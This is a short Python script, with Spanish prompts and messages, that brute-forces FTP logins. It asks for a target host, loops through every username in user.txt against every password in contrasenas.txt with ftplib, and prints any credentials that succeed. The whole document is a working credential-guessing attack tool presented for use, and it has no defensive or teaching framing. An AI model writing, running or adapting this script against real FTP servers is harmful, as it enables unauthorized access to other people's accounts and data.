import sys
import ftplib

def bruteForce_ftp(target,usuario,contrasena):
    ftp = ftplib.FTP(target)
    try:
        ftp.login(usuario,contrasena)
        ftp.quit()
        print('(+) Se encontraron las credenciales')
        print('{}:{}'.format(usuario,contrasena))
    except:
        print("fallo la autenticacion")

def main():
    target = input("ingrese target: ")
    users = open('user.txt','r')
    users = users.read().split("\n")
    passwords = open('contrasenas.txt','r')
    passwords = passwords.read().split("\n")

    for user in users:
        for password in passwords:
            bruteForce_ftp(target,user,password)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        sys.exit